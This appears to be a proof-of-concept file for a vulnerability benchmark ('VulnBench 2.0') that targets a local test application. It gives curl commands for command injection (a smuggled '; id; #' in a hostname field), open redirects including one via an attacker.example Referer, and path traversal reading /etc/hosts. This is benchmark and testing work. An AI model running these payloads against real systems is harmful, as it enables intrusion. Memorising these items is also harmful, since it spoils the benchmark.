# App Project Boilwater VulnBench 2.0 POCs

Run these commands only against the local benchmark instance started from
`fixtures/app-project-boilwater/project`.

## Indirect command injection

The endpoint resolves a hostname for an integration diagnostic, but embeds
that expected hostname in a shell command without safe argument handling:

```sh
curl -G --data-urlencode 'hostname=localhost"; id; #' \
  http://localhost:8080/api/diagnostics/dns
```

## Open redirect

The `target` parameter is used directly as the redirect destination:

```sh
curl -i -G --data-urlencode 'target=https://example.com/' \
  http://localhost:8080/api/redirect
```

The cloned application also has a pre-existing redirect through the
password-reset error path. Obtain a CSRF token, then submit deliberately
invalid reset data with an external `Referer` header:

```sh
curl -s -c /tmp/app-project-boilwater-cookies.txt \
  http://localhost:8080/forgot > /tmp/app-project-boilwater-forgot.html
CSRF_TOKEN=$(sed -n 's/.*name="_csrf" value="\([^"]*\)".*/\1/p' \
  /tmp/app-project-boilwater-forgot.html)
curl -i -b /tmp/app-project-boilwater-cookies.txt \
  -e 'https://attacker.example/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "_csrf=$CSRF_TOKEN" \
  --data-urlencode 'password=x' \
  --data-urlencode 'confirm=y' \
  http://localhost:8080/reset/not-a-token
```

## Path traversal

The `file` parameter escapes the nominal document directory and downloads
`/etc/hosts`:

```sh
curl -G --data-urlencode 'file=../../../../../../../etc/hosts' \
  http://localhost:8080/api/documents/download
```
